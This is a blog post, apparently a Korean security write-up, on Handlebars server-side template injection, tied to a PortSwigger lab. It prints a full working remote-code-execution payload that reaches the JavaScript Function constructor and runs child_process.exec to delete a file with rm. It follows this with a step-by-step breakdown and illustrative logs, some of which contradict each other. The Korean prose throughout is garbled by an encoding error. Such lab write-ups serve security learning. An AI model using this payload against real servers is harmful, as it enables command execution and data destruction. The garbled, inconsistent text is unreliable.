---
title: Handlebars SSTI
desc: Handlebars SSTIë€ ë¬´ì—‡ì¸ê°€?
date: 2024-12-04
thumbnail: /posts/advanced_skill/handlebars_ssti/thumbnail.png
---

## Handlebars SSTIë€?
Handlebars SSTIëŠ” ì„œë²„ ì¸¡ í…œí”Œë¦¿ ì—”ì§„ì¸ Handlebarsì—ì„œ ë°œìƒí•  ìˆ˜ ìˆëŠ” ë³´ì•ˆ ì·¨ì•½ì ì…ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ ê³µê²©ìê°€ ì„œë²„ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì½”ë“œë¥¼ ì£¼ì…í•  ìˆ˜ ìˆê²Œ í•˜ì—¬, ì›í•˜ì§€ ì•ŠëŠ” ëª…ë ¹ì–´ ì‹¤í–‰ì´ë‚˜ ë°ì´í„° ìœ ì¶œì„ ì´ˆë˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

> ğŸ’¡ ì´ ì·¨ì•½ì ì€ 4.0.14 ì´ì „ ë²„ì „ì—ì„œë§Œ ë°œìƒí•©ë‹ˆë‹¤.

---

## ë°°ê²½

### SSTI
SSTIëŠ” Server-Side Template Injectionì˜ ì•½ìë¡œ, í…œí”Œë¦¿ ì—”ì§„ì— ì•…ì˜ì ì¸ êµ¬ë¬¸ì„ ì‚½ì…í•˜ì—¬ ê³µê²©ì´ ì„±ê³µí•  ê²½ìš° RCE, LFI ë“±ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Handlebars
HandlebarsëŠ” Node.js ê¸°ë°˜ í”„ë ˆì„ì›Œí¬ì—ì„œ ì‚¬ìš©ë˜ëŠ” í…œí”Œë¦¿ ì—”ì§„ì…ë‹ˆë‹¤.

---

## Payload
```handlebars
{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```

---

## Payload Explain

### 1. "s" ë¬¸ìì—´ì„ ë³€ìˆ˜í™”
```handlebars
{{#with "s" as |string|}}
    ...
{{/with}}
```
`{{#with ... as |alias|}}`ëŠ” Handlebars.jsì—ì„œ ì œê³µí•˜ëŠ” ë¸”ë¡ í—¬í¼ë¡œ, "s"ë¼ëŠ” ë¬¸ìì—´ì„ **string**ì´ë¼ëŠ” ì´ë¦„ìœ¼ë¡œ ë³€ìˆ˜í™”í•©ë‹ˆë‹¤. ì´ ë³€ìˆ˜ëŠ” ì´í›„ ì¡°ì‘ ëŒ€ìƒì´ ë©ë‹ˆë‹¤.

```log
[INFO] "s" ë¬¸ìì—´ì´ string ë³€ìˆ˜ë¡œ í• ë‹¹ë¨
[DEBUG] string = "s"
```

### 2. split ê°ì²´ë¥¼ conslistë¼ëŠ” ë³€ìˆ˜ë¡œ í• ë‹¹
```handlebars
{{#with split as |conslist|}}
    ...
{{/with}}
```
`split`ì€ JavaScriptì—ì„œ ë¬¸ìì—´ì„ íŠ¹ì • êµ¬ë¶„ìë¥¼ ê¸°ì¤€ìœ¼ë¡œ ë‚˜ëˆ„ëŠ” ë©”ì„œë“œì…ë‹ˆë‹¤. ì´ í…œí”Œë¦¿ì—ì„œëŠ” ì´ë¥¼ í†µí•´ ë¦¬ìŠ¤íŠ¸(ë°°ì—´)ì²˜ëŸ¼ ë³´ì´ëŠ” ê°ì²´ë¥¼ ìƒì„±í•©ë‹ˆë‹¤. ìƒì„±ëœ ë¦¬ìŠ¤íŠ¸ëŠ” `conslist`ë¼ëŠ” ì´ë¦„ìœ¼ë¡œ ì €ì¥ë˜ë©°, ì´í›„ ê°ì²´ ë‚´ë¶€ ë©”ì„œë“œ(push, pop)ë¥¼ ì´ìš©í•´ ì¡°ì‘ë©ë‹ˆë‹¤.

```log
[INFO] split ê°ì²´ê°€ conslistë¡œ í• ë‹¹ë¨
[DEBUG] conslist ì´ˆê¸°ê°’ = []
```

### 3. pop ë©”ì„œë“œ í˜¸ì¶œ
```handlebars
{{this.pop}}
```
`pop` ë©”ì„œë“œëŠ” ë°°ì—´ì˜ ë§ˆì§€ë§‰ ìš”ì†Œë¥¼ ì œê±°í•˜ê³  ë°˜í™˜í•©ë‹ˆë‹¤. ë¦¬ìŠ¤íŠ¸ê°€ ë¹„ì–´ìˆìœ¼ë¯€ë¡œ ì•„ë¬´ê²ƒë„ í•˜ì§€ ì•ŠìŒ

```log
[INFO] conslistì—ì„œ pop ë©”ì„œë“œ í˜¸ì¶œ
[DEBUG] conslist = []
```

### 4. constructor ê°ì²´ì— ì ‘ê·¼
```handlebars
{{this.push (lookup string.sub "constructor")}}
```
`lookup`ëŠ” íŠ¹ì • ê°ì²´ì˜ ì†ì„±ì´ë‚˜ ë©”ì„œë“œì— ì ‘ê·¼í•˜ëŠ” í—¬í¼ì…ë‹ˆë‹¤. ì—¬ê¸°ì„œ `string.sub`ëŠ” string ê°ì²´ì—ì„œ sub ë©”ì„œë“œë¥¼ ì°¸ì¡°í•œ ê²ƒì…ë‹ˆë‹¤. `constructor`ëŠ” JavaScriptì˜ ëª¨ë“  ê°ì²´ì— ì¡´ì¬í•˜ëŠ” ê¸°ë³¸ ì†ì„±ìœ¼ë¡œ, ìƒì„±ì í•¨ìˆ˜ì— ì ‘ê·¼í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ê²°ê³¼ì ìœ¼ë¡œ ì´ ì½”ë“œëŠ” JavaScriptì˜ Function constructorë¥¼ ì°¸ì¡°í•˜ì—¬ ì„ì˜ ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•˜ê²Œ ë§Œë“­ë‹ˆë‹¤.

```log
[INFO] string.sub ë©”ì„œë“œì˜ constructor ì†ì„± ì°¸ì¡° ì‹œë„
[DEBUG] constructor = [Function: Function]
[INFO] conslistì— constructor ì°¸ì¡° ì¶”ê°€
[DEBUG] conslist = [[Function: Function]]
```

### 5. ì‹œìŠ¤í…œ ëª…ë ¹ì–´ ì •ì˜
```handlebars
{{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
```
ì—¬ê¸°ì„œ pushë¥¼ í†µí•´ ë¦¬ìŠ¤íŠ¸ì— ì‹œìŠ¤í…œ ëª…ë ¹ì–´ë¥¼ í¬í•¨í•˜ëŠ” ë¬¸ìì—´ì„ ì‚½ì…í•©ë‹ˆë‹¤. ëª…ë ¹ì–´ ë‚´ìš©:
`require('child_process')`ëŠ” Node.jsì—ì„œ ì‹œìŠ¤í…œ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ëª¨ë“ˆì„ ë¡œë“œí•©ë‹ˆë‹¤. `.exec(...)`ëŠ” ì‹œìŠ¤í…œ ì‰˜ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•˜ëŠ” ë©”ì„œë“œë¡œ, ì—¬ê¸°ì„œëŠ” ì„œë²„ì—ì„œ íŠ¹ì • íŒŒì¼(/home/carlos/morale.txt)ì„ ì‚­ì œí•˜ëŠ” ëª…ë ¹ì–´(rm)ë¥¼ ì‹¤í–‰í•˜ë ¤ê³  í•©ë‹ˆë‹¤.

```log
[ACTION] string.split í˜¸ì¶œë¡œ codelist ìƒì„±.
[STATE] codelist = ["return require('child_process').exec('rm /home/carlos/morale.txt');"]
```

### 6. í…œí”Œë¦¿ ë°˜ë³µë¬¸ ì‹¤í–‰
```handlebars
{{#each conslist}}
    {{#with (string.sub.apply 0 codelist)}}
        {{this}}
    {{/with}}
{{/each}}
```
`#each`ëŠ” Handlebars.jsì—ì„œ ì œê³µí•˜ëŠ” ë°˜ë³µë¬¸ìœ¼ë¡œ, ë¦¬ìŠ¤íŠ¸(conslist)ì˜ ëª¨ë“  ìš”ì†Œë¥¼ ìˆœíšŒí•©ë‹ˆë‹¤. `string.sub.apply(0, codelist)`ëŠ” `string.sub`ê°€ ë¬¸ìì—´ ë©”ì„œë“œ Functionì„ ì°¸ì¡°í•œ ê²ƒìœ¼ë¡œ, `apply`ë¥¼ ì‚¬ìš©í•´ ì‹¤í–‰ ì‹œ ì¸ìë¥¼ ë¦¬ìŠ¤íŠ¸ë¡œ ì „ë‹¬í•©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ì¡°ì‘ëœ codelistë¥¼ ì‹¤í–‰ ì»¨í…ìŠ¤íŠ¸ì— ì ìš©í•˜ì—¬ JavaScript ì½”ë“œë¥¼ ì‹¤í–‰í•˜ë ¤ í•©ë‹ˆë‹¤. ìµœì¢…ì ìœ¼ë¡œ `{{this}}`ëŠ” í…œí”Œë¦¿ ë‚´ì—ì„œ í˜„ì¬ ì»¨í…ìŠ¤íŠ¸ë¥¼ ì¶œë ¥í•˜ê±°ë‚˜ ì‹¤í–‰í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.

```log
[INFO] conslist ìˆœíšŒ ì‹œì‘ (í˜„ì¬ conslistëŠ” ë¹ˆ ë°°ì—´).
[ACTION] string.sub.apply í˜¸ì¶œë¡œ codelist ì‹¤í–‰.
[EXECUTE] "require('child_process').exec('rm /home/carlos/morale.txt');" ì‹¤í–‰.
```

ê³µê²©ìëŠ” í…œí”Œë¦¿ ì—”ì§„ì´ ì œê³µí•˜ëŠ” í—¬í¼ì™€ ë©”ì„œë“œ ì²´ì¸ ì¡°ì‘ ê¸°ëŠ¥ì„ ì´ìš©í•´ JavaScriptì˜ Function constructorì— ì ‘ê·¼í•˜ê³ , ì´ë¥¼ í†µí•´ ì½”ë“œë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.

---

## Reference
- [HackTricks - SSTI](https://book.hacktricks.xyz/kr/pentesting-web/ssti-server-side-template-injection)
- [Mahmoud Security Blog](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
- [Handlebars.js ê³µì‹ ë¬¸ì„œ](https://handlebarsjs.com/ko/guide/builtin-helpers.html#with)

---

## Lab
- [PortSwigger Lab](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)